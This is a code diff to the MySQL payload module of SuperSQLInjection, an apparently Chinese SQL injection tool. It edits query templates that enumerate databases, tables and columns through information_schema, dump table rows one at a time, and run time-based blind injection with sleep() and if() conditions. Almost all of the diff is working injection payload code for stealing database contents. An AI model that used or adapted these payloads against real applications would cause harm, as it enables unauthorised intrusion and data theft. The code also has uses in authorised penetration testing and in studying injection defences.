@@ -8,17 +8,17 @@ namespace SuperSQLInjection.payload
     class MySQL
     {
         //加载对应配置(需要读取的环境变量)
-        public static String path = "config/mysql5/ver.txt";
+        public static String path = "config/vers/mysql.txt";
         public static List<String> vers = FileTool.readFileToList(path);
 
         public static String char_length = "(select char_length({data}))";
         
         //数据库数量
-        public static String dbs_count = "(select count(*) from information_schema.schemata)";
+        public static String dbs_count = "(select count(1) from information_schema.schemata)";
         //表数量
-        public static String tables_count = "(select count(*) from information_schema.tables where table_schema='{dbname}')";
+        public static String tables_count = "(select count(1) from information_schema.tables where table_schema='{dbname}')";
         //列数量
-        public static String columns_count = "(select count(*) from information_schema.columns where table_schema='{dbname}' and table_name='{table}')";
+        public static String columns_count = "(select count(1) from information_schema.columns where table_schema='{dbname}' and table_name='{table}')";
 
 
         //获取数据库名
@@ -63,13 +63,14 @@ namespace SuperSQLInjection.payload
         public static String bool_ord_value = " " + mid_value + ">{len}";
 
         //获取行数据bool
-        public static String data_value = "(select {columns} from {dbname}.{table} limit {limit},1)";
+        public static String data_value = "(select {columns} from {dbname}.{table} limit {index},1)";
 
         //获取数据bool,加入orderby解决获取数据时，获取到的数据每一行可能不对称的可能
-        public static String data_value_orderBy = "(select {columns} from {dbname}.{table} order by {orderby} limit {limit},1)";
+        public static String data_value_orderBy = "(select {columns} from {dbname}.{table} order by {orderby} limit {index},1)";
 
         //union获取数据条数
         public static String data_count = "(select count(*) from {dbname}.{table})";
+
         //bool判断数据条数
         public static String bool_datas_count = " " + data_count + ">={len}";
 
@@ -83,10 +84,17 @@ namespace SuperSQLInjection.payload
         public static String hex_value = "(select hex(convert(({data}) using UTF8)))";
 
         public static String substr_value = "(select substr({data},{start},{len}))";
-        public static String getBoolCountBySleep(String data,int maxTime)
-        {    
-            return " (select * from (select(sleep("+ maxTime + "-(if(("+data+ ">{len}), 0, " + maxTime + ")))))"+Tools.RandStr(4)+")";
+        public static String getBoolDataBySleep(String data,int maxTime)
+        {
+            return " (select 1 from (select(sleep(" + maxTime + "-(if((" + data + ">{len}), 0, " + maxTime + ")))))" + Tools.RandStr(6) + ")";
         }
+
+        public static String getBoolCountBySleep(String data, int maxTime)
+        {
+            return " (select 1 from (select(sleep(" + maxTime + "-(if((" + data + "), 0, " + maxTime + ")))))" + Tools.RandStr(6) + ")";
+        }
+        
+
 
         /// <summary>
         /// 生成联合查询的列的字符串，如1,2,3,用于union注入
@@ -359,7 +367,7 @@ namespace SuperSQLInjection.payload
 
         public static String getBoolDataPayLoad(String column, String orderBy, String dbName, String table, int index)
         {
-            String data = data_value_orderBy.Replace("{columns}", column).Replace("{orderby}", orderBy).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{limit}", index + "");
+            String data = data_value_orderBy.Replace("{columns}", column).Replace("{orderby}", orderBy).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
             return data;
         }
 
